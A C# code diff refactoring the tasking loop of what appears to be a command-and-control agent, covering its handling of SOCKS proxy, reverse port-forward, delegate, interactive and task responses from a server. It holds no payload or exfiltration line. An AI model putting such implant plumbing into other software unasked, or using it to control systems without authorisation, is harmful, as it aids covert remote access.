@@ -116,7 +116,7 @@ namespace Agent
                 return true;
 
             }
-            catch (Exception e)
+            catch
             {
                 return false;
             }
@@ -154,39 +154,34 @@ namespace Agent
                 return;
             }
 
-            this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
-
-            //if (args.tasking_response.socks is not null)
-            //{
-            //    this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
-            //}
+            _ = this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
 
             if (args.tasking_response.rpfwd is not null)
             {
-                this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
+                _ =this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
             }
 
             if (args.tasking_response.tasks is not null)
             {
                 Parallel.ForEach(args.tasking_response.tasks, async task =>
                 {
-                    this.taskManager.StartTaskAsync(new ServerJob(task));
+                    _ = this.taskManager.StartTaskAsync(new ServerJob(task));
                 });
             }
 
             if (args.tasking_response.delegates is not null)
             {
-                this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
+                _ = this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
             }
 
             if(args.tasking_response.responses is not null)
             {
-                this.taskManager.HandleServerResponses(args.tasking_response.responses);
+                _ = this.taskManager.HandleServerResponses(args.tasking_response.responses);
             }
 
             if(args.tasking_response.interactive is not null)
             {
-                this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
+                _ = this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
             }
         }
         //Is this correct?
